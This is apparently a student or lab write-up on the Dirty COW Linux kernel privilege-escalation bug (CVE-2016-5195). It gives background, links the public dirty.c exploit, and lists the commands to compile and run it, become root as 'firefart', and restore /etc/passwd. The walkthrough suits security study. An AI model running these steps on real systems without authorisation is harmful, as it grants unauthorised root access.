

# once upon a time there is famous vulnerability on linux called dirty caw.

Dirty COW (Dirty copy-on-write) is a computer security vulnerability for the Linux kernel that affected all Linux-based operating systems, including Android devices, that used older versions of the Linux kernel created before 2018. It is a local privilege escalation bug that exploits a race condition in the implementation of the copy-on-write mechanism in the kernel's memory-management subsystem. Computers and devices that still use the older kernels remain vulnerable.

The vulnerability was discovered by Phil Oester.Because of the race condition, with the right timing, a local attacker can exploit the copy-on-write mechanism to turn a read-only mapping of a file into a writable mapping. Although it is a local privilege escalation, remote attackers can use it in conjunction with other exploits that allow remote execution of non-privileged code to achieve remote root access on a computer. The attack itself does not leave traces in the system log.

The vulnerability has the Common Vulnerabilities and Exposures designation CVE-2016-5195. Dirty Cow was one of the first security issues transparently fixed in Ubuntu by the Canonical Live Patch service.

The vulnerability has existed in the Linux kernel since version 2.6.22 released in September 2007, and there is information about it being actively exploited at least since October 2016. The vulnerability has been patched in Linux kernel versions 4.8.3, 4.7.9, 4.4.26 and newer.

The patch produced in 2016 did not fully address the issue and a revised patch was released on November 27, 2017, before public dissemination of the vulnerability.


source vulnerability : https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails

source forum : https://github.com/FireFart/dirtycow/blob/master/dirty.c
source github exploit : https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
source github code exploit : https://github.com/FireFart/dirtycow/blob/master/dirty.c

# can we try the same technique ? -

I checked the kernel version to see if any vulnerability exist

check kernel version : `uname –r`

and we have : `3.2.0-91-generic-pae`

source check kernel version : https://phoenixnap.com/kb/check-linux-kernel-version

so this vulnerability does exsit

#  --------------------

from above resource, we have code in dirty.c like https://github.com/FireFart/dirtycow/blob/master/dirty.c

with this, we just have to compile it with : `gcc -pthread dirty.c -o dirty -lcrypt`
Then run the newly create binary by either doing: `"./dirty" or "./dirty my-new-password"`

since in the c code, we use `firefart` as username
so now we can use this username and the password we just creacted : `su firefart` , we succsufully logged in
`whoami`
we have
`firefart`
use command id: `id`, we have:
`uid=0(firefart) gid=0(root) groups=0(root)`
we are root

restore the password:
`mv /tmp/passwd.bak /etc/passwd`